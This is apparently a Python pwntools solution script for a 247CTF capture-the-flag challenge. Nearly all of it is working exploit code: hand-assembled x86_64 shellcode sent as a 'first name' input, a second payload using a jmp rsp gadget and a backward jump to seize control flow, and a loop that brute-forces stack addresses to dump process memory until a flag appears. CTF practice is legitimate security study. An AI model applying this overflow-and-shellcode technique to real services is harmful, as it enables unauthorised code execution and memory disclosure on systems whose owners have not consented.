#!/usr/bin/env python3
from pwn import *
import re

HOST = "1a20405e02a419df.247ctf.com"
PORT = 50171
JMP_RSP = 0x400738
XCHG = 0x400732

flag_re = re.compile(rb"247CTF\{[0-9a-fA-F]{32}\}")

# Build 50-byte writer stage for (addr,len)
def build_writer(addr: int, length: int) -> bytes:
    stg = (
        b"\xB8\x01\x00\x00\x00" +         # mov eax,1
        b"\xBF\x01\x00\x00\x00" +         # mov edi,1
        b"\x48\xBE" + p64(addr) +           # mov rsi, addr
        b"\xBA" + p32(length) +             # mov edx,len
        b"\x0F\x05" +                       # syscall
        b"\xB8\x3C\x00\x00\x00" +         # mov eax,60
        b"\x31\xFF" +                       # xor edi,edi
        b"\x0F\x05"                         # syscall
    )
    assert len(stg) <= 50
    return stg.ljust(50, b"\x90")

second = p64(0x1111111111111111) + p64(JMP_RSP) + b"\xEB\xAE" + b"\x90"*6 + p32(XCHG)

# Typical Linux x86_64 stack top vicinity
bases = [0x7ffffffdc000, 0x7fffffff0000]
span = 0x40000
step = 0x800

for base in bases:
    for addr in range(base, base+span, step):
        first = build_writer(addr, step)
        try:
            io = remote(HOST, PORT, timeout=5)
            io.recvuntil(b"first name?")
            io.send(first)
            io.recvuntil(b"surname?")
            io.send(second)
            data = io.recvall(timeout=2) or b""
            io.close()
        except Exception:
            continue
        m = flag_re.search(data)
        if m:
            print(m.group(0).decode())
            raise SystemExit(0)

print("not found in scanned stack windows")
